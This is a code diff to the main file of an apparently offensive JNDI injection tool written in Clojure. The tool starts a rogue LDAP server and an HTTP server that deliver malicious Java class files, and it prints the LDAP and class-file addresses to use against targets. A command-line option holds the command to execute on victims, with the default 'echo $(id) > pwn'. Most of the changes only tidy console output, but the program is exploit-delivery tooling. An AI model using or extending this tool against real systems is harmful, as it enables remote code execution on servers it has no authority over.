@@ -1,5 +1,5 @@
 (ns jndi-injector-clj.core
-  (:require [ring.adapter.jetty :as jetty]
+  (:require [clojure.pprint :as pp]
             [jndi-injector-clj.ldap :as ldap]
             [jndi-injector-clj.server :as server]
             [clojure.tools.cli :refer [parse-opts]])
@@ -26,6 +26,14 @@
    :java7 {:ldap-base (gen-str) :class-name (gen-str)}
    :java8 {:ldap-base (gen-str) :class-name (gen-str)}})
 
+(defn format-conf [app-conf]
+  [{"Java version" "7"
+    "LDAP address" (str "ldap://localhost:1389/" (:ldap-base (:java7 app-conf)))
+    "URL" (str "http://localhost:" (:port app-conf) "/" (:class-name (:java7 app-conf)) ".class")}
+   {"Java version" "8"
+    "LDAP address" (str "ldap://localhost:1389/" (:ldap-base (:java8 app-conf)))
+    "URL" (str "http://localhost:" (:port app-conf) "/" (:class-name (:java8 app-conf)) ".class")}])
+
 (def cli-options
   [["-c" "--command COMMAND" "command to execute"
     :default "echo $(id) > pwn"]
@@ -37,9 +45,11 @@
 
 (defn -main [& args]
   (let [options (:options (parse-opts args cli-options))
-        port (:port options)
         app-conf (gen-conf options)
-        _ (println app-conf)
-        handler (server/gen-handler app-conf)]
+        _ (println "\nOPTIONS:")
+        _ (pp/print-table [{"Command"(:command options)}])
+        _ (println "\nLDAP addresses:")
+        _ (pp/print-table (format-conf app-conf))
+        _ (println "\n")]
     (.start (Thread. (fn [] (ldap/start app-conf))))
-    (jetty/run-jetty handler {:port port})))
+    (server/start app-conf)))
